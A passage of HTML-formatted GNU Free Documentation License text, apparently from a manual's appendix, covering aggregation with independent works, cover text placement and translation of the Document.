storage or distribution medium, is called an "aggregate" if the
copyright resulting from the compilation is not used to limit the legal
rights of the compilation's users beyond what the individual works
permit.  When the Document is included in an aggregate, this License does
not apply to the other works in the aggregate which are not themselves
derivative works of the Document.</P
><P
>If the Cover Text requirement of section 3 is applicable to these
copies of the Document, then if the Document is less than one half of
the entire aggregate, the Document's Cover Texts may be placed on covers
that bracket the Document within the aggregate, or the electronic
equivalent of covers if the Document is in electronic form.  Otherwise
they must appear on printed covers that bracket the whole
aggregate.</P

>F.9. TRANSLATION</H1
><P
>Translation is considered a kind of modification, so you may
distribute translations of the Document under the terms of section 4.
Replacing Invariant Sections with translations requires special
permission from their copyright holders, but you may include
translations of some or all Invariant Sections in addition to the
original versions of these Invariant Sections.  You may include a
translation of this License, and all the license notices in the
Document, and any Warranty Disclaimers, provided that you also include
the original English version of this License and the original versions
of those notices and disclaimers.  In case of a disagreement between the
translation and the original version of this License or a notice or
disclaimer, the original version will prevail.</P
><P
>If a section in the Document is Entitled "Acknowledgements",
"Dedications", or "History", the requirement (section 4) to Preserve its
Title (section 1) will typically require changing the actual
title.</P

to copy, modify, sublicense or distribute the Document is void, and will
